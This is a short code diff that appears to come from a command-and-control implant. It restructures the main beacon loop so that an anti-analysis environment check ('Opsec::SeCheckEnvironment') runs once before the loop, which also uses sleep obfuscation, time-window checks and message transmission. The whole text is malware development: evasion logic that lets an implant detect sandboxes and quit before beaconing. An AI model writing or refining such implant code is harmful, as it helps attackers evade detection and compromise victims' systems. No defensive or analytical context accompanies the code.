@@ -14,19 +14,16 @@ namespace Core {
             return_defer(ntstatus);
         }
 
+        Opsec::SeCheckEnvironment();
+        if (ntstatus == ERROR_BAD_ENVIRONMENT) {
+            return_defer(ntstatus);
+        }
+
         do {
             Opsec::SleepObf();
 
             if (!Opsec::CheckTime()) {
                 continue;
-            }
-
-            if (!Ctx->Session.Checkin) {
-                Opsec::SeCheckEnvironment();
-
-                if (ntstatus == ERROR_BAD_ENVIRONMENT) {
-                    return_defer(ntstatus);
-                }
             }
 
             Message::MessageTransmit();
